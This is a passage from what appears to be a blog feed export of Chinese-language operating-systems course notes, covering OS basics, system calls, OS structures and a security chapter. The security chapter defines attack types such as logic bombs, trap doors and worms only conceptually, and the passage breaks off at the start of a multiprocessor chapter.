href="#计算机系统的组成部分" class="headerlink" title="计算机系统的组成部分"></a>计算机系统的组成部分</h3><p>A computer system consists of </p><ol><li>硬件 Hardware </li><li>系统程序 system programs</li><li>应用程序 application programs</li></ol><h3 id="操作系统扮演的角色"><a href="#操作系统扮演的角色" class="headerlink" title="操作系统扮演的角色"></a>操作系统扮演的角色</h3><ol><li>an extended machine (对于用户: 让用户更好地使用机器, 是硬件的包装接口) </li><li>a resource manager (对于机器: 告知机器如何分配硬件资源, 是用户的命令代理执行者, 也是资源的分配者)</li></ol><p>是 an intermediary(中间调解人) between a user of a computer and the computer hardware.</p><h3 id="Operating-system-goals"><a href="#Operating-system-goals" class="headerlink" title="Operating system goals"></a>Operating system goals</h3><ol><li>Execute user programs and make solving user problems <strong>easier</strong>. <strong>简单</strong></li><li>Make the computer system <strong>convenient</strong> to use. <strong>易用</strong></li><li>Use the computer hardware in an <strong>efficient</strong> manner. <strong>高效</strong></li><li>Permit effective development, testing, and introduction of new system functions without interfering with service. （<strong>易于扩充</strong>）</li></ol><h3 id="一些正确叙述"><a href="#一些正确叙述" class="headerlink" title="一些正确叙述"></a>一些正确叙述</h3><ul><li><p><strong>Resource allocator</strong> – manages and allocates resources. </p></li><li><p><strong>Control program</strong> – controls the execution of user programs and operations of I/O devices .</p></li><li><p><strong>Kernel</strong> – the one program running at all times (all else being application programs).</p><p>OS 是唯一运行在内核态的程序, 并且是全程运行, 并且先于其他程序运行</p></li><li><p>OS 与用户交互的界面: <strong>Shell</strong> : 文本交互; <strong>GUI</strong> : 图像交互</p></li><li><p>内核态中, OS对所有的硬件具有完全的访问权, 可以执行任何对于硬件的指令. 而用户级程序只能使用机器指令中的子集</p></li></ul><h2 id="OS历史"><a href="#OS历史" class="headerlink" title="OS历史"></a>OS历史</h2><p>根据计算机本身的发展而发展</p><ul><li><p>真空管, 穿孔卡</p></li><li><p>晶体管, 批处理程序</p></li><li><p>集成电路, 多道程序Multiprogramming        </p><p>多道程序: 在计算机中同时存放多个作业( 但不一定是绝对意义上的 <strong>同时</strong> 运行 详细请参看进程一章)</p></li><li><p>个人计算机</p></li><li><p>手持计算机</p></li></ul><h2 id="OS分类"><a href="#OS分类" class="headerlink" title="OS分类"></a>OS分类</h2><ul><li> Mainframe operating systems （大型机OS）</li><li> Server operating systems （服务器OS） </li><li> Multiprocessor operating systems （多处理机OS） </li><li> Personal computer operating systems （个人计算机OS）</li><li> Real-time operating systems （实时 OS） <ul><li>硬实时: <ul><li>辅助储存空间有限或不存在, 所有数据只在寄存器或只读存储器ROM中保存</li><li>例如: 导弹制动系统</li><li>由于不存在任何辅助储存空间, 因此与分时系统是冲突的</li></ul></li><li>软实时: <ul><li>部分关键实时任务的优先级高于其他任务，并保留该优先级直到完成为止</li><li>例如:  industrial control or robotics 以及 applications (多媒体 VR等) requiring  advanced operating system features.</li></ul></li></ul></li><li> Embedded operating systems （嵌入式OS）</li><li> Smart card operating systems （智能卡OS)</li></ul><h2 id="计算机底层硬件"><a href="#计算机底层硬件" class="headerlink" title="计算机底层硬件"></a>计算机底层硬件</h2><p>计算机包括这些硬件组成部分</p><ol><li>CPU </li><li>Main Memory</li><li>IO Module</li><li>System Bus</li><li>…</li></ol><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/toplevel.png" alt=""></p><h3 id="中央处理器"><a href="#中央处理器" class="headerlink" title="中央处理器"></a>中央处理器</h3><p>从内存中提取指令并执行它们。 </p><ul><li>每个CPU都有一组可以执行的特定指令 称为该CPU的指令集( 例如8086指令集)</li><li>因为访问内存以获取指令或数据字比执行一条指令要花费更长的时间，所以所有CPU都在其中包含一些寄存器来保存键变量和临时结果。</li></ul><h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><ul><li>中断是CPU 在工作中的必要操作, 能够使工作更加高效</li><li>An interruption of the normal sequence of execution  </li><li>例如等待IO的过程中执行别的进程, 在IO结束时产生中断回到原进程继续执行</li><li>运行 - 中断 - 恢复 - 运行</li><li>中断分类<ul><li>程序中断<ul><li>运算溢出</li><li>除零</li><li>页面失效</li><li>执行非法指令</li></ul></li><li>时钟中断<ul><li>程序片使用完毕</li></ul></li><li>IO 中断</li><li>硬件错误</li></ul></li></ul><h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><h4 id="存储层次结构"><a href="#存储层次结构" class="headerlink" title="存储层次结构"></a>存储层次结构</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/cache.png" alt=""></p><ul><li>每一级都是下一级的内容的子集</li><li>从上到下: 更大 更慢 更便宜</li></ul><p>详见内存管理章节</p><h4 id="DMA-直接存储器存取"><a href="#DMA-直接存储器存取" class="headerlink" title="DMA 直接存储器存取"></a>DMA 直接存储器存取</h4><p>Transfers a block of data directly to or from memory</p><p>可以在不经有CPU的情况下直接访问Data Bus, 用于进一步简化CPU等待时间</p><h4 id="基址-限址-MMU"><a href="#基址-限址-MMU" class="headerlink" title="基址 限址 MMU"></a>基址 限址 MMU</h4><ul><li>Base register and limit register 基址寄存器和限界寄存器</li><li>MMU (Memory Management Unit) 内存管理单元</li></ul><h3 id="IO设备"><a href="#IO设备" class="headerlink" title="IO设备"></a>IO设备</h3><p>IO设备实际上包括(控制器与设备本身) A controller and the device itself. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/device.png" alt=""></p><p>IO中断</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/io.png" alt=""></p><ul><li>(a) Steps in starting an I/O device and getting interrupt 设备如何发起中断 </li><li>(b) How the CPU is interrupted 中央处理器如何处理中断</li></ul><p>总线</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/bus.png" alt=""></p><h2 id="OS概念"><a href="#OS概念" class="headerlink" title="OS概念"></a>OS概念</h2><h3 id="程序管理相关"><a href="#程序管理相关" class="headerlink" title="程序管理相关"></a>程序管理相关</h3><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><ul><li>Process: a program in execution.</li></ul><h4 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h4><ul><li>Address space: a list of memory locations from some minimum to some maximum, which the process can read and write.</li></ul><h4 id="进程表"><a href="#进程表" class="headerlink" title="进程表"></a>进程表</h4><ul><li>Process table: where all the information about each process is stored in.</li></ul><h4 id="进程树"><a href="#进程树" class="headerlink" title="进程树"></a>进程树</h4><ul><li>process tree </li></ul><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><ul><li>process is divided into threads that can run simultaneously </li><li>线程 Thread : <ul><li>CPU可分配的最基本单元</li><li>能够执行与中断</li></ul></li></ul><h4 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h4><ul><li>Inter-process communication<ul><li>Related processes that are cooperating to get some job done often need to communicate with one another and synchronize their activities.</li><li>为了完成某项工作而进行协作的相关流程通常需要彼此通信并同步其活动。</li></ul></li></ul><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><ul><li>Deadlock: when two or more processes are interacting, they can sometimes get themselves into a stalemate (僵持) situation they cannot get out of.</li></ul><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><ul><li>Pipe: a sort of pseudofile that used to connect two processes.</li></ul><h3 id="文件管理相关"><a href="#文件管理相关" class="headerlink" title="文件管理相关"></a>文件管理相关</h3><h4 id="设备无关性"><a href="#设备无关性" class="headerlink" title="设备无关性"></a>设备无关性</h4><p>操作系统的主要功能是隐藏磁盘和其他IO设备的特性，并为程序员提供一个与设备无关的文件的漂亮，简洁的抽象模型。<strong>设备无关性</strong> : device-independent</p><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>Director: A place to keep files, a way of grouping files together. System calls are then needed to create and remove directories. </li></ul><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul><li><p>File system: Calls are also provided to put an existing file in a directory, and to remove a file from a directory. Directory entries may be either files or other directories.</p></li><li><p>挂载mount</p></li></ul><h3 id="架构相关"><a href="#架构相关" class="headerlink" title="架构相关"></a>架构相关</h3><h4 id="微内核"><a href="#微内核" class="headerlink" title="微内核"></a>微内核</h4><ul><li>Microkernel architecture （微内核结构）</li><li>assigns only a few essential functions to the kernel 只分配了最基本功能<ul><li>➢ address space </li><li>➢ inter-process communication (IPC)</li><li>➢ basic scheduling</li></ul></li></ul><h4 id="对称多处理"><a href="#对称多处理" class="headerlink" title="对称多处理"></a>对称多处理</h4><ul><li>Symmetric multiprocessing（对称多处理） <ul><li>there are multiple processors 多个处理器</li><li>these processors share same main memory and I/O facilities   共享主存与IO设备</li><li>All processors can perform the same functions  所有处理器可执行相同的功能</li></ul></li></ul><h4 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h4><ul><li>Distributed operating systems（分布）<ul><li>provides the illusion of a single main memory and single secondary memory space 虽然是分布式但是给人感觉像是单个主存单个辅助存储空间的错觉</li><li>used for distributed file system 常用于分布式文件系统</li></ul></li></ul><h4 id="面向对象设计"><a href="#面向对象设计" class="headerlink" title="面向对象设计"></a>面向对象设计</h4><ul><li>Object-oriented design（面向对象设计） <ul><li>used for adding modular extensions to a small kernel  用于向小内核添加模块化扩展</li><li>enables programmers to customize an operating system without disrupting system integrity 使程序员能够自定义操作系统，而不会破坏系统完整性</li></ul></li></ul><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h3 id="系统调用的流程"><a href="#系统调用的流程" class="headerlink" title="系统调用的流程"></a>系统调用的流程</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/sys%20call.png" alt=""></p><p>系统调用需要11步来实现</p><p>以 <code>read (fd, buffer, nbytes)</code> 为例; 从 <code>fd</code> 文件向<code>buffer</code> 缓冲区中读入 <code>nbytes</code> 内容</p><ol><li>用户程序:  保存 <code>nbytes</code> 参数</li><li>用户程序:  保存 缓冲区地址 参数</li><li>用户程序:  保存 文件 参数</li><li>用户程序:  调用库函数中的代码</li><li>库程序:      将相关代码存入寄存器</li><li>陷入内核, 此时CPU的使用权转移至内核态</li><li>处理指令</li><li>读取数据</li><li>返回库程序</li><li>返回用户程序</li><li>用户程序:  SP++ 执行下一条指令</li></ol><h3 id="常见的系统调用"><a href="#常见的系统调用" class="headerlink" title="常见的系统调用"></a>常见的系统调用</h3><h4 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/unix1.png" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/unix2.png" alt=""></p><h4 id="Win32"><a href="#Win32" class="headerlink" title="Win32"></a>Win32</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/win32.png" alt=""></p><h2 id="OS结构"><a href="#OS结构" class="headerlink" title="OS结构"></a>OS结构</h2><h3 id="单体系统"><a href="#单体系统" class="headerlink" title="单体系统"></a>单体系统</h3><ul><li>Monolithic system (单体系统): The structure is that there is <strong>no structure</strong>. </li><li>The OS is written as a collection of procedures, each of which can call any of the other ones whenever it needs to.操作系统是作为过程的集合编写的，每个过程都可以在需要时调用任何其他过程。</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/mono.png" alt=""></p><h3 id="分层系统"><a href="#分层系统" class="headerlink" title="分层系统"></a>分层系统</h3><ul><li>Layered system (分层系统): Organize the OS as a hierarchy of layers, each one constructed upon the one below it 层次结构，每个层次结构都基于其下一层</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/layer.png" alt=""></p><h3 id="微内核系统"><a href="#微内核系统" class="headerlink" title="微内核系统"></a>微内核系统</h3><ul><li>Microkernels (微内核结构): Put as little as possible in kernel model</li></ul><h3 id="Client-Server-Model"><a href="#Client-Server-Model" class="headerlink" title="Client-Server Model"></a>Client-Server Model</h3><ul><li>现代OS的趋势是: 采用<strong>将代码进一步移到更高层</strong>的想法，并尽可能<strong>从内核模式中删除</strong>，从而保留最小的微内核。</li><li>The client-server model, all the kernel does is handle the communication between clients and servers. 内核只负责处理客户端和服务器之间的通信。</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/14/CS%20Model.png" alt=""></p><h3 id="虚拟系统"><a href="#虚拟系统" class="headerlink" title="虚拟系统"></a>虚拟系统</h3><ul><li>Virtual Machines (虚拟机): 系统的核心被称为 <strong>虚拟机监视器</strong> virtual machine monitor直接运行在硬件层, 并且向下一层提供多个虚拟的机器</li><li>下图仅为虚拟化的一种实现方式, 详见多处理器系统章节</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%961.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统 系列文章链接🔗&lt;/p&gt;
&lt;p&gt;操作系统之概述:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;OS 定义&lt;/li&gt;
&lt;li&gt;OS 历史&lt;/li&gt;
&lt;li&gt;OS 分类&lt;/li&gt;
&lt;li&gt;计算机底层硬件一览&lt;/li&gt;
&lt;li&gt;OS 中的基本概念&lt;/li&gt;
&lt;li&gt;系统调用&lt;/li&gt;
&lt;li&gt;OS 结构&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之安全</title>
    <link href="http://yoursite.com/2020/08/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2020/08/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%AE%89%E5%85%A8/</id>
    <published>2020-08-11T06:42:28.000Z</published>
    <updated>2020-08-15T11:05:03.963Z</updated>
    
    <content type="html"><![CDATA[<p>本章将涉及:</p><ol><li>安全与威胁</li><li>简易密码学(真的很简易!)</li><li>用户认证</li><li>系统受到的攻击<ol><li>来自内部</li><li>来自外部</li></ol></li><li>保护机制</li><li>信任系统</li><li>OS安全</li></ol><p><em>本文匆匆赶制, 内容粗糙简陋</em></p><a id="more"></a><h2 id="安全与威胁"><a href="#安全与威胁" class="headerlink" title="安全与威胁"></a>安全与威胁</h2><div class="table-container"><table><thead><tr><th>Goal</th><th>Threat</th></tr></thead><tbody><tr><td>Data confidentiality 数据机密性</td><td>Exposure of data 数据泄露</td></tr><tr><td>Data integrity           数据完整性</td><td>Tampering with data 数据篡改</td></tr><tr><td>System available     系统可用性</td><td>Denial of service      拒绝服务</td></tr></tbody></table></div><p>首先保护数据的机密性, 防止数据泄露.   需要保证数据不被外界所知.</p><p>其次要保证数据的完整性, 防止数据被破坏.  不能被外界破坏.</p><p>最后要保证系统的可用性, 防止系统拒绝服务. 例如DoS攻击等</p><p>入侵者 intruder or sometimes 敌人 adversary<br>a) Passive intruders(被动入侵者)- to read files they are not authorized to<br>read<br>b) Active intruders(主动入侵者)- to make unauthorized changes to data</p><p>常见的安全入侵场景有:</p><ol><li>Casual prying (窥探) by nontechnical users     被非专业使用者随意窥探</li><li>Snooping by insiders  被内部人员窥视</li><li>Determined attempt to make money  为了利益</li><li>Commercial or military espionage   商业或军事间谍</li></ol><p>常见的数据丢失场景有:</p><ol><li><p>天灾</p><p>fires, floods, wars</p></li><li><p>软硬件错误</p><p>CPU malfunction, bad disk, program bugs </p></li><li><p>人为错误</p><p>data entry, wrong tape mounted</p><hr></li></ol><h2 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h2><p><em><u>了解即可</u></em></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul><li>斯巴达将军</li><li>戚继光: 反切注音法</li><li>周恩来: 豪密</li><li>菲利普与玛丽女王</li><li>一战: 齐默尔曼电报</li><li>二战: Enigma密码机, 图灵</li></ul><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><ul><li>? - 1949 古典密码<ul><li>密码学还不是科学, 而是艺术</li><li>数据的安全<strong>基于算法的保密</strong></li><li>一般的加密方法是<strong>替换</strong></li><li>单表替换密码(凯撒密码), 多表替换密码(Playfair密码, Hill密码) , 转轮密码(Enigma)</li></ul></li><li>1949 - 1975 复杂计算的密码<ul><li>由于算力提升使得复杂计算的密码称为可能</li><li>1949年,香农发表了&lt;&lt;保密系统的信息理论&gt;&gt;(The Communication Theory of Secrecy Systems), 它证明了密码编码 学是如何置于坚实的数学基础之上的，从此密码学发展成为 一个专门学科。——标志性事件 </li><li>数据的安全<strong>基于密钥</strong>而不是算法的保密</li></ul></li><li>1975 - 公钥密码<ul><li>公钥密码学成为主要研究方向 </li><li><strong>公钥密码</strong>使得发送端和接收端<strong>无密钥传输的保密通信</strong>成为可能</li></ul></li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><ul><li>传统密码/常规密码/私钥密码/单钥密码 conventional / private-key / single-key</li><li>发送方和接收方共享一个共同的密钥</li><li>20世纪70年代以前私钥密码是唯一类型 </li><li>至今仍广泛应用</li></ul><h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><ul><li>公钥/双钥/非对称密码都是指使用两个密钥: <ul><li>公钥：可以对任何人公开的密钥，用于加密消息或 验证签名。 </li><li>私钥：只能由接收者私存，用于解密消息或签名。 </li></ul></li><li>非对称 <ul><li>用于加密消息或验证签名的人不能进行消息的加密或消息的签名。</li></ul></li></ul><hr><h2 id="用户认证⭐"><a href="#用户认证⭐" class="headerlink" title="用户认证⭐"></a>用户认证⭐</h2><p>Authentication<br>user authentication（用户验证） crackers（骇客）</p><p>认证必须要能够标识使用者的身份</p><p>用户认证应当在使用系统之前完成</p><p>三种认证方式</p><ol><li><p>Something the user knows</p><p>密码, 口令</p></li><li><p>Something the user has</p><p>钥匙, 芯片, 动态密码, 验证码</p></li><li><p>Something the user is</p><p>指纹, 虹膜</p></li></ol><blockquote><p>UNIX 安全系统会对输入的密码进行<strong>加盐</strong>(Salt), 即将每一个口令同一个叫做盐（Salt）的n位随机数相关联。无论何时口令改变，这个随机数就改变。将口令和随机数连接起来，一同加密，加密后的结果存放进口令文件。</p><p>One-Time passwords 对于函数 y=f(x) 已知y求x的难度远大于已知x求y的难度. </p></blockquote><h3 id="一些用户认证时的对策"><a href="#一些用户认证时的对策" class="headerlink" title="一些用户认证时的对策"></a>一些用户认证时的对策</h3><ul><li>Limiting times when someone can log in    限制登录时间</li><li>Automatic callback at number prespecified   自动回调 (例如判断密码是否太过简单)</li><li>Limited number of login tries   限制尝试的登录次数</li><li>A database of all logins    记录所有尝试登录的数据</li><li>Simple login name/password as a trap  使用简单的密码作为陷阱 (假装登陆成功)</li><li>security personnel notified when attacker bites 当检测到攻击者时通知安全人员</li></ul><hr><h2 id="系统受到的攻击"><a href="#系统受到的攻击" class="headerlink" title="系统受到的攻击"></a>系统受到的攻击</h2><h3 id="Insider-Attacks-内部攻击"><a href="#Insider-Attacks-内部攻击" class="headerlink" title="Insider Attacks 内部攻击"></a>Insider Attacks 内部攻击</h3><h4 id="Logic-Bombs"><a href="#Logic-Bombs" class="headerlink" title="Logic Bombs"></a>Logic Bombs</h4><p>（逻辑炸弹）由一些公司的编程人员或使用这些受保护的计算机、编制核心软件的员工实施.秘密的嵌在产品的操作系统中的代码，特定情况下爆炸</p><h4 id="Trap-Doors"><a href="#Trap-Doors" class="headerlink" title="Trap Doors"></a>Trap Doors</h4><p>（后门）系统程序员跳过正常的认证过程并插入一段代码造成<br>的。代码审查 code review</p><h4 id="Login-Spoofing"><a href="#Login-Spoofing" class="headerlink" title="Login Spoofing"></a>Login Spoofing</h4><p>（登录欺骗）假冒的登录屏幕</p><h4 id="Trojan-Horses"><a href="#Trojan-Horses" class="headerlink" title="Trojan Horses"></a>Trojan Horses</h4><p>特洛伊木马 诱导用户运行攻击代码</p><h4 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h4><p>缓冲区溢出攻击</p><h3 id="Outside-Attacks-外部攻击"><a href="#Outside-Attacks-外部攻击" class="headerlink" title="Outside Attacks 外部攻击"></a>Outside Attacks 外部攻击</h3><h4 id="Virus"><a href="#Virus" class="headerlink" title="Virus"></a>Virus</h4><p>病毒: 不断地复制自身并传播</p><h4 id="Morris-Worm"><a href="#Morris-Worm" class="headerlink" title="Morris Worm"></a>Morris Worm</h4><p>蠕虫: 先潜伏自己的存在, 直到传播到一定规模后再爆发</p><p>(zero-day Attack</p><p>Zombie</p><p>…</p><h2 id="系统设计的原则"><a href="#系统设计的原则" class="headerlink" title="系统设计的原则"></a>系统设计的原则</h2><ol><li>System design should be public </li><li>Default should be no access </li><li>Check for current authority </li><li>Give each process least privilege possible </li><li>Protection mechanism should be 保护机制应当<ul><li>simple 简单</li><li>uniform  统一</li><li>in lowest layers of system  处于系统底层</li></ul></li><li>Scheme should be psychologically acceptable</li></ol><h2 id="保护机制-⭐"><a href="#保护机制-⭐" class="headerlink" title="保护机制 ⭐"></a>保护机制 ⭐</h2><h3 id="Protection-Domains"><a href="#Protection-Domains" class="headerlink" title="Protection Domains"></a>Protection Domains</h3><p>注: 下文中提到的 <em>用户</em> 也可能指进程</p><p>保护域</p><p>a domain is a set of （object， right） pairs. Each pair specifies an object and some<br>subset of the operations that can be performed. A right means permission to perform one of the operations.<br>一对对象权限的组合，每对组合指定一个对象和一些可在上面运行的操作子集指对某个操作的执行许可.</p><p>人话: 一张表, 记录了所有的文件和每个用户允许对文件进行的操作</p><p>缺点: 太大</p><h3 id="Access-Control-Lists-ACL"><a href="#Access-Control-Lists-ACL" class="headerlink" title="Access Control Lists , ACL"></a>Access Control Lists , ACL</h3><p>访问控制列表</p><p>每个对象的有序列表里包含了所有可访问对象的域以及这些域如何访问这些对象的方法</p><p>人话: 由于文件多而域少, 因此在每个文件处记录哪些域能进行什么操作. 将保护域按文件分解</p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>权能字</p><p>使用按行存储时，与每个进程关联的是可访问的对象列表，以及每个对象上叫做权能字列表，每个单独的项目叫做权能字</p><p>人话: 每个用户自己储存对每个文件能进行什么操作, 将保护域按用户分解</p><p>因此要防止权能字被用户自己篡改(三种方法)</p><ol><li>First way, require a tagged architecture </li><li>Second way, keep the C-list inside the OS </li><li>Third way, keep the C-list in user space, but manage the capabilities cryptographically</li></ol><h2 id="可信任系统"><a href="#可信任系统" class="headerlink" title="可信任系统"></a>可信任系统</h2><p>完全可信任的系统是否存在?</p><p>可信任系统的核心是 <strong>可信计算基Trusted Computing Base, TCB</strong></p><p>TCB 是一种机制, 保护所有敏感操作; (例如切换进程, 进程创建, 内存映射管理等) 任何试图访问这些操作的进程必须通过可信计算基的安全审查, 称为 reference monitor (访问监视器)</p><blockquote><p>All system calls go through the reference monitor for security checking</p></blockquote><p>TCB可以通过硬件, 软件, 固件的形式实现, 它只是个机制. </p><p>一旦可信计算机基的某个构件出现程序错误或者安全隐患，就对整个系统的安全造成危害。 与之相反，如果除可信计算基之外的系统的其他部分出现问题，也只是泄漏了系统安全策略赋予它们的相关权限而已，这些权限一般都是比较低的。</p><p>现代操作系统努力降低TCB的大小，使得对其代码库彻底的检查成为可能.</p><hr><p><strong>操作系统系列</strong></p><ol><li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li><li>操作系统之安全  (本文)</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章将涉及:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安全与威胁&lt;/li&gt;
&lt;li&gt;简易密码学(真的很简易!)&lt;/li&gt;
&lt;li&gt;用户认证&lt;/li&gt;
&lt;li&gt;系统受到的攻击&lt;ol&gt;
&lt;li&gt;来自内部&lt;/li&gt;
&lt;li&gt;来自外部&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;保护机制&lt;/li&gt;
&lt;li&gt;信任系统&lt;/li&gt;
&lt;li&gt;OS安全&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;em&gt;本文匆匆赶制, 内容粗糙简陋&lt;/em&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之多处理器系统</title>
    <link href="http://yoursite.com/2020/08/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2020/08/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-08-08T14:59:29.000Z</published>
    <updated>2020-08-15T11:04:34.529Z</updated>
    
    <content type="html"><![CDATA[<p>本章将会涉及:</p><ol><li>多处理器系统</li><li>多计算机系统</li><li>虚拟化</li><li>分布式</li></ol><a id="more"></a><p>对更快的计算是推动计算机进步的动力. 除了从技术层面上突破(如优化芯片) , 人们还设计了这些系统来提高计算水平. </p><ol><li><p>计算机并行处理, 主要体现在同一个计算机中存在多个处理器 , 这些处理器 <u>共享内存模块</u> (share memory model ). 称为 <strong>多处理器系统</strong> (<strong>Multiprocessors</strong>)</p><blockquote><p>注意与 <strong>多核</strong> 的区别</p><p>多处理器指: 在一个机器中有多个处理器;</p><p>多核: 在一个处理器中有多个处理芯片</p></blockquote></li><li><p>多个计算机相互协作. 表现为不同的计算机通过 <u>消息传递</u> 的而协作.(紧耦合)  称为 <strong>多计算机系统</strong> (<strong>Multicomputers</strong> )</p></li><li><p>多个计算机互相协作. 表现为通过 <u>广域分布式系统</u> (指网络) 协作. (松耦合) 称为 <strong>分布式系统</strong> (<strong>Distributed systems</strong>)</p></li></ol><p><img src='https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%89%E7%A7%8D%E6%8A%80%E6%9C%AF.png' height = '500' width = '1300'></img></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E6%AF%94%E8%BE%83.png" alt=""></p><p>除此之外本章还会涉及到 <strong>虚拟化技术</strong> (Virtualization ).</p><h2 id="多处理器系统"><a href="#多处理器系统" class="headerlink" 